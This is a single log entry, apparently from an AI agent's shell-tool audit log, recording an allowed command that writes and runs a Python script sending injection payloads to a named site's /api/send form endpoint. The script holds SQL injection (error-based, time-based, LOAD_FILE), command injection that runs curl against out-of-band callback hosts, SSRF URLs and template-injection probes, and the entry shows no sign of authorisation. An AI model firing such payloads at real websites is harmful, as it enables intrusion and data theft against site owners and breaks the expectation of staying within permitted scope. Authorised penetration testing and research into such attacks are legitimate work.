{"ts": 1790750927.6403944, "decision_id": "3038d3c46ebf", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/phase2/api_send_inj.py <<'PYEOF'\nimport requests, json, time\nURL=\"https://www.infinitycapital.bh/api/send\"\nUA=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36\"\ns=requests.Session(); s.headers.update({\"User-Agent\":UA,\"Content-Type\":\"application/x-www-form-urlencoded\"})\n\nSQLI=\"ooba0ee07e9a5b1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\"\nCMDI=\"oob6c8f540878d9.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\"\nSSRF=\"oobff031bc30ae9.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\"\nSSTI=\"oobd084a7c3f413.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\"\n\ndef base():\n    return {\"fname\":\"Bob\",\"lname\":\"Tester\",\"areacode\":\"973\",\"tel\":\"5551234\",\n            \"cname\":\"QA\",\"subject\":\"Hello\",\"msg\":\"Body text\",\"check\":\"on\",\n            \"targets\":\"contact@site.invalid\"}\n\ndef fire(name, field, value):\n    d=base(); d[field]=value\n    try:\n        r=s.post(URL,data=d,timeout=20,allow_redirects=False)\n        print(f\"[{name}] {field}={value[:60]!r} -> {r.status_code} len={len(r.content)} body={r.text[:120]!r}\")\n    except Exception as e:\n        print(f\"[{name}] EXC {e}\")\n    time.sleep(1.2)\n\n# --- SQLi (OOB via LOAD_FILE/INTO OUTFILE style) into several fields\nfire(\"sqli\",\"fname\", \"' OR (SELECT 1 FROM (SELECT SLEEP(0))a)-- \")\nfire(\"sqli\",\"subject\", \"x' UNION SELECT LOAD_FILE('\"+SQLI+\"')-- \")\nfire(\"sqli\",\"cname\", \"'+(SELECT CONCAT(0x7e,(SELECT 1 FROM information_schema.tables),0x7e))-- \")\nfire(\"sqli\",\"msg\", \"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- \")\n# time-based\nfire(\"sqli-time\",\"tel\", \"5551234' AND SLEEP(5)-- \")\n\n# --- CMDi\nfire(\"cmdi\",\"fname\", \"Bob;curl http://\"+CMDI+\"/cmdi;\")\nfire(\"cmdi\",\"msg\", \"x`curl http://\"+CMDI+\"/cmdi2`\")\nfire(\"cmdi\",\"cname\", \"QA$(curl http://\"+CMDI+\"/cmdi3)\")\n\n# --- SSRF (targets is a URL/host used by server)\nfire(\"ssrf\",\"targets\", \"http://\"+SSRF+\"/ssrf\")\nfire(\"ssrf\",\"cname\", \"http://\"+SSRF+\"/ssrf2\")\nfire(\"ssrf\",\"fname\", \"http://\"+SSRF+\"/ssrf3\")\n\n# --- SSTI\nfire(\"ssti\",\"fname\", \"{{7*7}}\")\nfire(\"ssti\",\"msg\", \"${7*7}\")\nfire(\"ssti\",\"subject\", \"#{7*7}\")\nfire(\"ssti\",\"cname\", \"<%= 7*7 %>\")\nPYEOF\npython3 tool_outputs/phase2/api_send_inj.py 2>&1 | tee tool_outputs/phase2/api_send_inj.log"}
